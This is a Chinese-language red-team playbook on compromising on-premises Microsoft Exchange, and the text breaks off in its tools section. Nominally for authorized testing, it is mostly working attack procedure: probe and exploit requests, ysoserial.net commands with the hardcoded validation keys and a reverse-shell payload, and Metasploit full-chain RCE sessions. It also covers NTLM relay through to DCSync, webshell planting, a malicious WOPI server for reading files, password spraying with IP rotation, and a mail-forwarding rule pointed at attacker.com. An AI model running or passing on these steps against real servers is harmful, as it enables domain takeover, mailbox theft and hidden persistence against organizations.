# Exchange 专项（深度版 v2）

> 结构：架构认知 → 侦察指纹 → 漏洞检测 → CVE 利用 → 凭据打法 → 工具库 → 落地与内存马 → 扩大战果 → 检测对抗。
> 所有利用仅限授权环境；检测优先用无损方式（DNSLog/响应差异），利用前完成授权复核。
> v2 更新：新增 CVE-2026-45504（WOPI/WAC SSRF→任意文件读取）；工具库与漏洞利用扩为操作级。

## 1. 知识点讲解：为什么 Exchange 是红队头号目标

Exchange 的价值是「四位一体」：

1. **位置**：443 对外提供 Web 邮件，同时又直连域控做认证——边界与内网双重属性，一台机器横跨两张网。
2. **权限**：Exchange 服务器机器账户隶属 `Exchange Windows Permissions`、`Exchange Trusted Subsystem` 等特权组；历史默认部署下 `Exchange Windows Permissions` 对域根对象持有 WriteDACL——拿下 Exchange 往往可直接 RBCD/DCSync 拿全域（见 05-01）。
3. **数据**：全域通讯录、架构文档、含密码的运维邮件、VPN 手册——邮箱本身就是情报库。
4. **架构弱点**：前端 IIS（443）做认证与代理，后端（444/内网端口）信任前端转发——历代大洞（Proxy 家族）几乎全部源于「前端校验与后端信任不一致」；而 WOPI/WAC、EWS 订阅等「服务器代发请求」功能又持续产出 SSRF 类新洞（8581 → 21410 → 45504 一脉相承）。

一句话：打 Exchange 不是打邮件系统，是打一台「对外的域特权跳板」。

## 2. 架构认知（攻击面地图）

### 2.1 部署角色与版本线

| 大版本 | X-OWA-Version | 生命周期 | 备注 |
| --- | --- | --- | --- |
| Exchange 2013 | 15.0.x | 2023-04 已停止支持 | 存量仍在跑，Nday 全吃 |
| Exchange 2016 | 15.1.x | 2025-10 停止支持 | 国内存量主力，CU23 为末代 |
| Exchange 2019 | 15.2.x | 支持中 | CU14/CU15 在役 |
| Exchange SE | 15.2.x（≥15.02.1113 起） | 当前主线 | 补丁跟进快 |

精确补丁级：拿 build 号对照微软官方文档《Exchange Server build numbers and release dates》，即可推出装了哪个 CU/SU、缺哪个补丁（5.10 给出 2026-06 SU 的具体阈值表）。

### 2.2 关键虚拟目录（攻击面清单）

| 路径 | 功能 | 攻击价值 |
| --- | --- | --- |
| `/owa/auth/logon.aspx` | Web 邮箱登录 | 指纹页、喷洒入口 |
| `/ecp/` | 管理控制台 | ProxyToken/CVE-2020-0688 利用点 |
| `/ews/exchange.asmx` | Web 服务 API | 凭据后读邮件/搜索、8581 订阅、45504 ReferenceAttachment、喷洒 |
| `/autodiscover/autodiscover.xml` `.json` | 自动配置发现 | ProxyShell/NotShell 混淆入口、用户枚举 |
| `/oab/` | 离线地址簿 | 全域通讯录导出 |
| `/rpc/`（RPC over HTTP） | Outlook 老协议 | NTLM 认证喷洒 |
| `/mapi/emsmdb/` | MAPI over HTTP | Ruler 利用通道 |
| `/powershell/` | PowerShell remoting | ProxyNotShell 反序列化后端 |
| `/Microsoft-Server-ActiveSync` | 手机同步 | Basic 认证喷洒 |
| `/aspnet_client/` | 静态资源目录 | webshell 经典落点（可解析） |
| WOPI/WAC 预览路径 | 文档在线预览集成 | 45504 的 SSRF 触发面（无固定对外路径，走 EWS 附件流） |

### 2.3 前后端信任模型（Proxy 家族根源）

```text
客户端 → 前端 443（校验 URL/认证）→ 按 cookie/路径路由 → 后端 444（信任前端，直接执行）
                ↑ 攻击核心：让前端「以为已认证/以为是静态资源」，把恶意请求转发给后端

SSRF 家族（8581/21410/45504）的第二模型：
客户端 → Exchange 业务功能（订阅/预览/附件）→ Exchange 主动向「攻击者指定的 URL」发请求
                ↑ 攻击核心：Exchange 变成 confused deputy，请求带服务器身份与内网位置
```

## 3. 侦察与指纹

### 3.1 发现（测绘语法，配 01-02）

```text
FOFA:   app="Microsoft-Exchange" || body="/owa/auth/logon.aspx" || title="Outlook"
Shodan: http.title:"Outlook" || http.component:"Outlook Web App"
证书线: cert="mail.target.com" / cert="autodiscover.target.com"
```

### 3.2 端点探测与版本识别

```bash
# 大版本（响应头）
curl -skI "https://mail.target.com/owa/auth/logon.aspx" | grep -i "x-owa-version"

# 更细的构建号：登录页源码中的静态资源版本串
curl -sk "https://mail.target.com/owa/auth/logon.aspx" | grep -oE "15\.[0-9]+\.[0-9]+\.[0-9]+" | sort -u

# 端点存活性批量探测
for p in owa/auth/logon.aspx ecp/ ews/exchange.asmx autodiscover/autodiscover.xml oab/ rpc/ mapi/emsmdb/ powershell/ Microsoft-Server-ActiveSync aspnet_client/; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://mail.target.com/$p")
  echo "$code  /$p"
done

# 已上机时的本地版本判定
# PowerShell: Get-ExchangeServer | fl Name,AdminDisplayVersion
# 或查看 C:\Program Files\Microsoft\Exchange Server\V15\Bin\Microsoft.Exchange.Setup.exe 文件版本
```

### 3.3 本地部署 vs Exchange Online 判定

```bash
dig MX target.com +short
# 指向 *.mail.protection.outlook.com → 云上（本文件漏洞链不适用，转钓鱼/OAuth 滥用/legacy 认证喷洒）
# 指向自有公网 IP/自建域 → 本地部署，进入本文件流程
dig autodiscover.target.com +short
```

### 3.4 用户枚举（打名单，供喷洒/钓鱼）

| 手法 | 说明 | 工具/命令 |
| --- | --- | --- |
| OWA 响应差异 | 有效/无效用户登录响应时间或页面差异 | `Invoke-DomainHarvestOWA`（MailSniper，见 7.3） |
| autodiscover 枚举 | 构造请求观察认证响应差异 | ruler `brute` 模式（见 7.4） |
| EWS 枚举 | NTLM 认证差异 | MailSniper 对应模块 |
| OAB/GAL | 有任意凭据后导出全域通讯录 | `Get-GlobalAddressListFromEws`（MailSniper） |

## 4. 漏洞检测（无损优先，分级验证）

### 4.1 三级检测纪律

```text
L1 指纹对表：版本/build → 第 5 节 CVE 表匹配（零发包风险，但有滞后误差）
L2 无损验证：DNSLog 外带 / 响应差异对比（证明存在，不触发破坏）
L3 最小利用：whoami 级回显、写无害标记文件读回、读自建 canary 文件（证明可利用，不碰真实敏感文件）
```

### 4.2 通用检测工具

```bash
# nuclei（模板最全，先更新）
nuclei -ut && nuclei -u https://mail.target.com -tags exchange,microsoft -severity critical,high

# Metasploit 检测模块
msfconsole -q -x "use auxiliary/scanner/http/exchange_proxylogon; set RHOSTS mail.target.com; set VHOST mail.target.com; set SSL true; run; exit"
```

### 4.3 重点漏洞手工检测

**ProxyLogon（CVE-2021-26855）**
```bash
curl -sk -X POST "https://mail.target.com/owa/auth/x.js" \
  -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3" \
  -H "Content-Type: text/xml" -d "<Autodiscover/>" -o resp.txt -w "%{http_code}\n"
# 判定：与正常请求对比响应码/内容差异；存在则后端 ECP 被预认证触达
```

**ProxyShell（CVE-2021-34473）**
```bash
curl -sk "https://mail.target.com/autodiscover/autodiscover.json?@victim.com/owa/?&Email=autodiscover/autodiscover.json@victim.com" \
  -o resp.txt -w "%{http_code}\n"
# 判定：返回 200 且响应带后端处理头（X-FEServer / X-CalculatedBETarget）→ 存在混淆
```

**ProxyNotShell（CVE-2022-41040）**
```bash
curl -sk "https://mail.target.com/autodiscover/autodiscover.json%20@victim.com/owa/?&Email=autodiscover/autodiscover.json@victim.com" -w "%{http_code}\n"
# 社区检测 PoC：搜「horizon3ai CVE-2022-41040」仓库（检测型，非武器化）
```

**ProxyToken（CVE-2021-33766）**：构造带 `SecurityToken` cookie 的 /ecp 请求，观察是否绕过登录直达 ECP 后端。

**CVE-2026-45504（WOPI/WAC SSRF→文件读）**
```text
① 版本阈值判定（首选，零风险）：build 低于下表即受影响——
   2016 CU23 < 15.01.2507.069 | 2019 CU14 < 15.02.1544.041
   2019 CU15 < 15.02.1748.046 | SE RTM   < 15.02.2562.043
② 环境侧判定：确认启用了 Office Online Server/WAC 预览集成（有 SharePoint/OOS 联动时才走 WOPI 链）
③ 利用级验证仅在隔离实验环境进行：读自建 canary 文件（如 C:\inetpub\canary.txt），严禁读真实敏感文件
```

**EWS SSRF（CVE-2018-8581）**：需任意有效凭据——用 PrivExchange 订阅推送，观察 Exchange 是否向攻击机发起 NTLM 认证（既检测又利用，见 5.1）。

### 4.4 检测注意事项

- 全程低频：手工 curl 单发验证即可，不要用扫描器把 /ecp /autodiscover 打满（Exchange 前面常有 WAF+SOC）。
- nuclei 只选 exchange 相关 tag，不要全模板轰。
- 检测证据留存：请求/响应完整记录（时间、源 IP、payload、响应码）——报告与自证两用。
- 第三方 PoC 用前必读源码（藏后门/回传的钓鱼 PoC 是真实风险），隔离环境跑通再上目标。

## 5. CVE 详解与漏洞利用（核心）

### CVE 速查总表

| CVE | 别名/类型 | 认证需求 | 影响版本要点 | 武器化成熟度 |
| --- | --- | --- | --- | --- |
| CVE-2018-8581 | EWS PushSubscription SSRF→中继提权 | 任意凭据 | 2010~2019 未补丁 | 高（PrivExchange） |
| CVE-2020-0688 | 静态 validationKey 反序列化 RCE | 任意凭据 | 2010~2019 未补丁 | 高（MSF/ysoserial.net） |
| CVE-2021-26855 等 | ProxyLogon | 无 | 2013/2016/2019 | 极高（MSF+大量 PoC） |
| CVE-2021-33766 | ProxyToken（ECP 认证绕过） | 无 | 2013/2016/2019 | 中 |
| CVE-2021-34473/34523/31207 | ProxyShell | 无 | 2013/2016/2019 | 极高（MSF+PoC） |
| CVE-2021-42321 | 认证后 RCE（PS 反序列化） | 凭据 | 2016/2019 | 高（MSF） |
| CVE-2022-41040/41082 | ProxyNotShell | SSRF 预认证 + 触达 PS 后端 | 2013/2016/2019 | 高（MSF 模块） |
| CVE-2022-41080(+41076) | OWASSRF + TabShell | 41080 预认证 | 2013/2016/2019 | 中（检测 PoC 公开） |
| CVE-2024-21410 | NTLM 中继权限提升 | 中继场景 | 2019（未启 EPA） | 中（在野利用过） |
| CVE-2025-53786 | 混合部署权限提升 | on-prem 高权 | 混合 Exchange/云 | 跟进每周情报（12） |
| **CVE-2026-45504** | **WOPI/WAC SSRF→任意文件读取** | **低权邮箱账户** | **2016 CU23/2019 CU14/CU15/SE RTM（2026-06 SU 前）** | **高（HawkTrace 公开 PoC）** |

> 每个洞统一按「原理 → 前置条件 → 利用步骤 → 成功标志 → 排错 → 落地衔接」展开。

---

### 5.1 CVE-2018-8581：EWS PushSubscription SSRF → 中继拿域

**原理**：EWS 的 PushSubscription 允许任意有效凭据订阅「有事件就向指定 URL 推送通知」。Exchange 会以**机器账户**身份向该 URL 发起 NTLM 认证——把这次认证中继到 LDAP，就能借机器账户的高权限（WriteDACL）给低权用户赋 RBCD，最终 DCSync。

**前置条件**：任意一个有效域凭据（喷洒/钓鱼/泄露均可得）；攻击机与 DC 之间 LDAP(S) 可达（内网或隧道内执行）；目标未装 2019-02 补丁。

**利用步骤**：
```bash
# ① 攻击机起中继（LDAPS 优先；LDAPS 不通时评估 LDAP + --remove-mic）
ntlmrelayx.py -t ldaps://dc01.corp.local --escalate-user lowuser --remove-mic -smb2support

# ② 用凭据触发订阅（PrivExchange，dirkjanm 开源）
python3 privexchange.py -ah <攻击机IP> -ap 443 -u lowuser -p 'P@ss' -d corp.local exchange.corp.local
# → Exchange 机器账户 NTLM 认证被打到攻击机 → 中继至 DC → lowuser 获得对 DC 的 RBCD 权限

# ③ S4U 拿票（05-01 委派流程）
getST.py -spn cifs/dc01.corp.local -impersonate administrator -dc-ip 10.0.0.1 corp.local/lowuser:'P@ss'
export KRB5CCNAME=administrator.ccache

# ④ 收割
secretsdump.py -k -no-pass dc01.corp.local -just-dc
```
**成功标志**：ntlmrelayx 控制台出现 ` Authenticated against ldaps://dc01` 与 RBCD 写入成功提示；getST.py 输出 ccache 文件。
**排错**：LDAPS 拒绝 → 改 `ldap://` 并确认域签名策略；订阅无回调 → 检查攻击机 443 是否被防火墙拦、Exchange 出站策略；escalate 失败 → 机器账户无 WriteDACL（目标域做过权限收敛），退回普通凭据打法。
**落地衔接**：本质是域提权链，落地动作见 05-01；Exchange 本机无需落马。

---

### 5.2 CVE-2020-0688：静态 validationKey 反序列化 RCE

**原理**：所有 Exchange 安装的 web.config 中 `validationKey`/`decryptionKey` 是**全球统一硬编码值**。有任意凭据登录 ECP 拿到 `ViewStateUserKey` 后，即可用 ysoserial.net 构造合法 ViewState，服务端反序列化 → SYSTEM 级 RCE。

**前置条件**：任意有效凭据 + /ecp 可达 + 未装 2020-02 补丁。

**利用步骤**：
```bash
# ① 浏览器/脚本登录 ECP，抓四样：ASP.NET_SessionId  cookie、__VIEWSTATEGENERATOR、
#    ViewStateUserKey（在页面隐藏域或个人资料接口中）
# ② 生成载荷
ysoserial.net.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell -e <base64反弹命令>" \
  --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" \
  --validationalg="SHA1" \
  --decryptionkey="E9D2490BD0075B51D1BA529851389043" \
  --decryptionalg="TripleDES" \
  --viewstateuserkey="<抓到的值>" --generator=<抓到的值>
# ③ 生成的 __VIEWSTATE 以 POST 发往 /ecp/default.aspx（带 session cookie）
# MSF 一键：use exploit/windows/http/exchange_ecp_viewstate（设 USERNAME/PASSWORD 即可）
```
**成功标志**：监听端口收到 SYSTEM 权限反弹；MSF 直接返回 meterpreter 会话。
**排错**：500 无回显 → gadget 被过滤，换 `TypeConfuseDelegate`/`ActivitySurrogateSelector`；键值报错 → 确认目标大版本（2010 与 2013+ 键值不同组）；不出网 → 改落地命令为写文件/内存马孵化（第 8 章方案 C）。
**落地衔接**：w3wp 是 SYSTEM，直接进第 8 章内存马或第 9 章变现。

---

### 5.3 ProxyLogon（CVE-2021-26855/26857/26858/27065）

**原理**：前端对静态资源路径（`/owa/auth/x.js` 类）的 cookie 处理混淆——构造 `X-AnonResource`/`X-BEResource` cookie 可让前端把**未认证请求**代理到任意后端端点（预认证 SSRF）。

**前置条件**：无凭据；2013/2016/2019 未装 2021-03 SU；知道一个存在的邮箱地址（枚举/猜测 admin@ 均可）。

**利用步骤（经典 OAB 写马）**：
```text
① POST /owa/auth/x.js（构造 cookie）           → 验证 SSRF（见 4.3）
② SSRF POST /autodiscover/autodiscover.xml     → 拿管理员邮箱 LegacyDN
③ SSRF POST /ecp/DDI/DDIService.svc/GetObject  → 拿 OABVirtualDirectory 标识 + msExchEcpCanary
④ SSRF POST .../SetObject（schema=OABVirtualDirectory）→ ExternalUrl 改为带 aspx 载荷的伪 URL
⑤ SSRF POST .../SetObject（schema=ResetOABVirtualDirectory）→ 载荷写入 ClientAccess\OAB 可解析文件
⑥ GET /owa/auth/<落地文件>.aspx                 → webshell 上线
```
（各公开 PoC 参数细节略有差异，以所选 PoC 源码为准；MSF 模块 `exploit/windows/http/exchange_proxylogon_rce` 自动全链，设 RHOSTS/VHOST/EMAIL/LHOST 即可。）
**成功标志**：④ 返回 200、⑥ 能访问到马并执行 whoami（NT AUTHORITY\SYSTEM）。
**排错**：② 拿不到 LegacyDN → 换邮箱（必须真实存在）；④ 失败 → canary 过期，重新走③；马 404 → OAB 路径随版本不同，查 PoC 输出中的真实落点 URL。
**落地衔接**：写马只是跳板——立即评估 EDR，进第 8 章迁移内存马；OAB ExternalUrl 用后记得还原（第 10 章撤收）。

---

### 5.4 ProxyShell（CVE-2021-34473/34523/31207）

**原理**：`/autodiscover/autodiscover.json@x.com/owa/...` 显式 URL 混淆——前端误判为匿名 autodiscover 放行，后端按 /owa 处理。三洞连环：34473（预认证路径混淆）→ 34523（PowerShell 后端权限提升）→ 31207（写文件 RCE）。

**前置条件**：无凭据；未装 2021-04/07 SU；一个存在的邮箱地址。

**利用步骤**：
```text
① GET /autodiscover/autodiscover.json?@foo/owa/...      → 预认证确认（见 4.3）
② POST autodiscover.xml（经混淆路径）                    → LegacyDN
③ POST /mapi/nspi 或 EWS                                 → 用户 SID
④ New-MailboxExportRequest 导出 .pst                     → 邮箱数据直接到手
⑤ 借 PowerShell 端点写文件（31207）                      → aspx shell 落盘
```
**工具**：MSF `exploit/windows/http/exchange_proxyshell_rce`（设 EMAIL + RHOSTS + LHOST 全链自动）。
**成功标志**：MSF 拿到 meterpreter（SYSTEM）；手工链中 pst 文件出现在共享目录。
**排错**：① 403 → 补丁已装或前置 WAF 拦截，换编码变体或直接测 ProxyNotShell；导出 pst 卡住 → 检查目标磁盘空间与导出共享路径权限。
**落地衔接**：同 5.3——SYSTEM 到手即进第 8 章。

---

### 5.5 ProxyNotShell（CVE-2022-41040/41082）

**原理**：41040 是 autodiscover 混淆的补丁绕过（`@` 技巧加 URL 编码变体绕过 IIS URL Rewrite 缓解）；触达后端 `/powershell/` 后，41082 利用 remoting 通道的反序列化（System.Windows.Markup/PSObject）执行代码。

**前置条件**：目标未装 2022-11 SU；仅配 URL Rewrite 缓解时尝试编码绕过；需指定一个真实邮箱地址（无需其密码）。

**利用步骤**：
```bash
# ① 4.3 的检测确认混淆存在（含 %20 编码变体）
# ② MSF 全链
use exploit/windows/http/exchange_proxynotshell_rce
set RHOSTS mail.target.com
set VHOST mail.target.com
set EMAIL admin@target.com      # 存在的邮箱
set LHOST <攻击机>
run
```
**成功标志**：meterpreter 会话（SYSTEM）。
**排错**：SSRF 通但 41082 无反应 → PS 后端版本已补，退回文件读/凭据路线；公开检测 PoC 多、利用 PoC 少——不要死磕手工复现，直接 MSF。
**落地衔接**：第 8 章。

---

### 5.6 OWASSRF + TabShell（CVE-2022-41080/41076）

**原理**：41080 是 `/owa/` 路径的又一预认证 SSRF（绕过 ProxyNotShell 补丁的新入口）；41076（TabShell）是认证后 RCE，与 SSRF 串成完整链。
**前置条件**：未装 2022-12 SU；41076 段需要凭据。
**利用现状**：公开以 CrowdStrike 检测型 PoC（Playwright 驱动）为主，武器化程度低于前三代——实战定位为「ProxyNotShell 被补后的备选入口」，新利用动态跟进每周情报（12）。

---

### 5.7 CVE-2021-42321（认证后 RCE）

**原理**：凭据 + PowerShell 后端反序列化 RCE。
**价值定位**：喷洒拿到弱口令账户后的**直接升级路径**，不依赖 Proxy 系漏洞；流量走合法认证通道，比漏洞路径安静。
**利用**：MSF 对应模块（设凭据即打）；亦常作为「合法凭据 + 静默利用」的隐蔽路线。
**落地衔接**：第 8 章。

---

### 5.8 CVE-2024-21410（NTLM 中继权限提升）

**原理**：Exchange 未启用 Extended Protection（EPA）时，NTLM 认证可被中继——这是对「SSRF 时代」的回归：强制认证触发目标/管理员机器向 Exchange 认证，中继到 Exchange 服务完成冒充与提权。
**利用链**：
```bash
# ① 强制认证（四选一，视目标补丁）
coercer.py coerce -l <攻击机> -t <目标机> -u lowuser -p 'P@ss' -d corp.local
# ② 中继到 Exchange 服务
ntlmrelayx.py -t https://mail.corp.local/ews/exchange.asmx -smb2support
# 或中继到 LDAP/ADCS，按 05-01 与 8581 的变现路线走
```
**检测要点**：目标是否启用 EPA（握手差异/CU 版本推断）。
**价值定位**：内网场景（已有立足点）大于外网；是 Exchange 中继打法的现代延续。

---

### 5.9 CVE-2025-53786（混合部署权限提升）

针对 Exchange 混合部署（本地 + Exchange Online 共享服务主体）：本地 Exchange 被控后可向云端提权，CISA 发过紧急指令。细节与 PoC 动态由每周情报（12）滚动补充；混合架构客户盘点资产时优先核查。

---

### 5.10 CVE-2026-45504：WOPI/WAC SSRF → 任意文件读取（2026-06 新洞）[^1^][^2^]

**原理**：Exchange 与 SharePoint/Office Online Server 的 WOPI/WAC 集成在生成文档预览 URL 时，调用链 `GetTokenRequestWebResponse → GetWacUrl → OneDriveProUtilities.TryTwice` 会请求 WOPI 提供方的 OData XML，解析出 `WebApplicationUrl`、`AccessToken`、`AccessTokenTtl`——**但不校验 WebApplicationUrl 的 URL scheme**。攻击者控制端点返回 `file:///C:/path#`：

```text
Exchange 追加 OAuth 参数后：file:///C:/windows/win.ini#&access_token=...&access_token_ttl=...
                                    ↑ # 之后全是 URI fragment，被解析器丢弃
实际请求路径仍是 file:///C:/windows/win.ini → Exchange 用 FileWebRequest 读盘 → 内容回给攻击者
```

**前置条件**：
- 任意低权邮箱账户（PR:L——喷洒/钓鱼/泄露得的普通账户即可）；
- 目标为本地部署 2016 CU23 / 2019 CU14 / 2019 CU15 / SE RTM，且低于 2026-06-09 安全更新（阈值表见 4.3）；Exchange Online 不受影响；
- 环境启用了 WOPI/WAC 文档预览集成（与 SharePoint/OOS 联动时常见）。

**披露时间线**：2026-06-09 补丁日披露 → 2026-06-24 HawkTrace 公开 PoC（GitHub）→ 利用门槛从「理论」降为「照抄即可」[^1^][^2^][^3^]。

**利用步骤**：
```text
① 攻击机搭恶意 WOPI 端点（HTTPS 可达的 VPS）：
   收到 Exchange 的 WOPI 属性请求后，返回 OData XML：
   { "WebApplicationUrl": "file:///C:/inetpub/canary.txt#",
     "AccessToken": "x", "AccessTokenTtl": "0" }
② 用低权凭据通过 EWS 创建 ReferenceAttachment，
   ProviderEndpointUrl 指向①的恶意端点（PoC 已封装此 SOAP 流）
③ 触发附件预览（OWA 打开该附件 / EWS 触发预览路径）
   → Exchange 向①发起 SSRF 请求 WOPI 属性
④ Exchange 拿到 file:///...# 后追加 token 参数（被 fragment 丢弃）
   → FileWebRequest 读本地文件 → 内容经预览流返回攻击者
```

**读什么（按价值排序）**：
```text
<Exchange>\V15\ClientAccess\owa\web.config         # 机器密钥/连接配置线索
<Exchange>\V15\Bin\*.config / 应用配置文件            # 内部拓扑、服务名、凭据碎片
C:\Windows\System32\inetsrv\config\applicationHost.config  # IIS 全局配置、站点绑定
无人值守安装/脚本残留（unattend.xml、部署 ps1）        # 常含明文密码
证书/私钥文件（若可读）                                # 流量与身份冒充材料
```

**升级路径（文件读 → RCE）**：
```text
文件读 → web.config/配置中的凭据与密钥
  ├─ 拿到更高权凭据 → 5.2（0688）/5.7（42321）反序列化 RCE
  ├─ 拿到内部拓扑/服务信息 → 内网其他系统打点（02/03 分册）
  └─ SSRF 本体（http scheme 变体）→ 打内网 HTTP 服务（02-02 SSRF 思路）
```

**成功标志**：预览响应中出现 canary 文件内容；攻击端点日志可见来自 Exchange 服务器 IP 的 WOPI 请求。
**排错**：Exchange 不出站 → 该环境 egress 受限，SSRF 类全废，退回反序列化路线；预览不触发 → 确认 WOPI/OOS 集成是否启用（未启用则此洞无面）；返回 500 → 检查恶意端点证书与 OData XML 格式（PoC 有模板）。
**落地衔接**：此洞本身无代码执行——定位是「凭据后的情报放大器」；读到凭据/密钥后走 5.2/5.7 上机，再进第 8 章。
**红线提醒**：生产环境验证只读自建 canary 文件；读真实 web.config/私钥等于制造数据暴露，授权与报备先行[^4^]。

---

### 5.11 历史洞补充速记

- **CVE-2021-27065**：ProxyLogon 四兄弟中的任意文件写，写马原语本体。
- **CVE-2021-26857**：Unified Messaging 反序列化（补链用）。
- **CVE-2023-21707 / 36745 等**：认证后 RCE/EoP 家族，凭据路线的备选。
- 原则：Exchange 洞的「保质期」取决于目标补丁节奏——2016/2019 存量里三年内的认证后 RCE 基本都能用；SSRF 家族（8581→41080→21410→45504）是这个产品持续产洞的主线，值得专门盯。

## 6. 凭据打法（无漏洞路线，外网最常用）

### 6.1 密码喷洒（接口矩阵）

| 接口 | 认证方式 | 特点 |
| --- | --- | --- |
| /owa | 表单 | 有锁与验证码风险，先测锁定策略 |
| /ews/exchange.asmx | NTLM/Basic | 最直接，日志在 EWS |
| /autodiscover/autodiscover.xml | Basic | 响应差异清晰 |
| /Microsoft-Server-ActiveSync | Basic | 常被忽视 |
| /rpc/rpcproxy.dll | NTLM | Outlook Anywhere |

```bash
# MailSniper（dafthack，PowerShell，域内/外通用）
Import-Module .\MailSniper.ps1
Invoke-PasswordSprayEWS -ExchHostname mail.target.com -UserList users.txt -Password 'Corp@2026' -Threads 5
Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList users.txt -Password 'Corp@2026'

# SprayingToolkit / CredMaster（云函数出口轮换 IP，防封）
python3 atomizer.py owa mail.target.com 'Corp@2026' users.txt
python3 credmaster.py --plugin owa --access-key X --secret-access-key Y -u users.txt -p 'Corp@2026'

# ruler 爆破/枚举模式
./ruler --domain target.com brute --users users.txt --passwords passes.txt --delay 600 --attempts 2
```

**防锁纪律**（05-02 通用规则在 Exchange 的落地）：每账户 ≤2 次/时、全用户共享一口径为一轮、先单账户试阈值、`--delay` 毫秒级间隔、失败后冷却翻倍。

### 6.2 拿到凭据后的标准动作

```powershell
# ① 读邮件搜情报（EWS，动静小）
Invoke-SelfSearch -Mailbox target@corp.com -ExchHostname mail.corp.com -Terms "password","vpn","拓扑"

# ② 导全域通讯录（名单扩大器）
Get-GlobalAddressListFromEws -ExchHostname mail.corp.com | Out-File gal.txt

# ③ Ruler 恶意表单（老版本直接 RCE；新版本用于探测/枚举）
./ruler --email u@corp.com --username u --password 'P@ss' form add --suffix trigger --input form.tpl

# ④ 有 ApplicationImpersonation 权限 → 读任意邮箱（管理员级情报源）

# ⑤ 凭据 + 漏洞升级：45504 文件读（5.10）→ 0688/42321 RCE（5.2/5.7）→ 第 8 章落地
```

## 7. 工具库（专项装备详解）

> 用法约定：每件工具给「简介 → 安装 → 核心命令 → 实战要点」。第三方 PoC 用前必读源码并在隔离环境跑通。

### 7.1 nuclei —— 无损检测主力

- **简介**：ProjectDiscovery 的模板化扫描器，Exchange 检测模板覆盖 Proxy 家族主要 CVE。
- **安装**：`go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`；首次 `nuclei -ut` 更新模板库。
- **核心命令**：
```bash
nuclei -u https://mail.target.com -tags exchange -severity critical,high -rl 50 -o exchange_findings.txt
nuclei -l exchange_assets.txt -tags exchange,microsoft -rl 80 -stats       # 批量资产
```
- **实战要点**：只选 exchange tag（全模板会轰出 WAF/封 IP）；`-rl` 限速；模板更新滞后于新 CVE（如 45504 需手工按 4.3 检测）；输出 `[cve-2021-26855] [http] [critical] URL` 即为命中，配合 curl 手工复验（4.3）再进入利用。

### 7.2 Metasploit —— 检测与利用一体化

- **简介**：Exchange 相关模块是目前武器化最完整的公开实现，覆盖 0688/ProxyLogon/ProxyShell/ProxyNotShell/42321。
- **模块清单**：
```text
auxiliary/scanner/http/exchange_proxylogon            # ProxyLogon 检测
auxiliary/scanner/http/exchange_proxyshell_log_rce?   # 以 metasploit-framework 内 exchange 关键字搜索为准
exploit/windows/http/exchange_proxylogon_rce          # ProxyLogon 全链写马
exploit/windows/http/exchange_proxyshell_rce          # ProxyShell 全链
exploit/windows/http/exchange_proxynotshell_rce       # ProxyNotShell 全链（需 EMAIL）
exploit/windows/http/exchange_ecp_viewstate           # 0688 反序列化
search exchange                                        # 实战时以模块库实际清单为准
```
- **典型会话**：
```bash
msfconsole -q
use exploit/windows/http/exchange_proxyshell_rce
set RHOSTS mail.target.com
set VHOST mail.target.com
set SSL true
set EMAIL administrator@target.com
set LHOST <攻击机IP>
set LPORT 443
run
# 成功 → meterpreter (NT AUTHORITY\SYSTEM)
```
- **实战要点**：拿到 meterpreter 后**立即 migrate** 出 w3wp 到稳定进程（`run post/windows/manage/migrate`），或只用它做跳板执行内存马孵化（8.3 方案 C）；MSF 流量与进程特征明显，EDR 环境得手即换 C2（06 分册）；目标不出网时改用 bind payload 或改落地为写文件。

### 7.3 MailSniper —— 凭据喷洒与邮箱情报（dafthack）

- **简介**：PowerShell 模块，Exchange 凭据攻击与邮件情报的事实标准。
- **安装**：`git clone https://github.com/dafthack/MailSniper`；`Import-Module .\MailSniper.ps1`（需 `-ep bypass`）。
- **功能与命令**：
```powershell
Invoke-DomainHarvestOWA -ExchHostname mail.x.com -UserList candidates.txt -OutFile valid_users.txt  # 用户枚举
Invoke-PasswordSprayEWS -ExchHostname mail.x.com -UserList users.txt -Password 'Corp@2026'          # EWS 喷洒
Invoke-PasswordSprayOWA -ExchHostname mail.x.com -UserList users.txt -Password 'Corp@2026'          # OWA 喷洒
Invoke-SelfSearch -Mailbox u@x.com -Terms "密码","vpn","机密"                                        # 自己邮箱搜情报
Invoke-OpenInboxFinder -ExchHostname mail.x.com -UserList users.txt -Password 'x'                    # 找对别人开放的收件箱
Get-GlobalAddressListFromEws -ExchHostname mail.x.com | Out-File gal.txt                            # 全域通讯录
```
- **实战要点**：枚举先行（名单质量决定喷洒效率）；`-Threads` 别贪大；EWS 操作会写 EWS 日志（第 10 章），大动作前想好说辞。

### 7.4 ruler —— MAPI/HTTP 瑞士军刀（SensePost）

- **简介**：直接说 MAPI 协议的 Exchange 客户端，枚举、喷洒、GAL 导出、恶意表单、收件规则后门一体。
- **安装**：github `sensepost/ruler` release 二进制（Linux/Windows/macOS）。
- **功能矩阵与命令**：
```bash
./ruler --domain x.com brute --users users.txt --passwords pass.txt --delay 600 --attempts 2   # 防锁喷洒
./ruler --email u@x.com --username u --password 'p' abk dump                                   # 导 GAL 通讯录
./ruler --email u@x.com --username u --password 'p' form add --suffix t1 --input form.tpl      # 恶意表单（老版本 RCE）
./ruler --email u@x.com --username u --password 'p' rules add --name "sync" --trigger "机密" \
        --forward collect@attacker.com                                                          # 收件规则转发后门
```
- **实战要点**：CVE-2017-11774 修复后恶意表单直接 RCE 基本失效，ruler 的价值转向**枚举/GAL/收件规则后门**；收件规则属用户级持久化（第 9 章④），隐蔽但归撤收清单管。

### 7.5 CredMaster / SprayingToolkit —— 防封喷洒

- **简介**：CredMaster（knavesec）借 AWS FireProx 每请求换出口 IP，专治「喷两轮就封 IP」。
- **安装**：`git clone https://github.com/knavesec/CredMaster` + 配置 AWS 密钥。
- **核心命令**：
```bash
python3 credmaster.py --plugin owa --access-key AK --secret-access-key SK \
  -u users.txt -p 'Corp@2026' --threads 4 --delay 30
python3 credmaster.py --plugin ews  ...   # 插件支持 owa/ews/o365/msol 等
```
- **实战要点**：轮换 IP 只解决封 IP，**不解决账户锁定**——防锁纪律照守；云函数出口可能被目标网关归为数据中心 IP 段整体降权，结合 UA 拟真。

### 7.6 中继与权限变现 —— ntlmrelayx / coercer / PrivExchange / bloodyAD

```bash
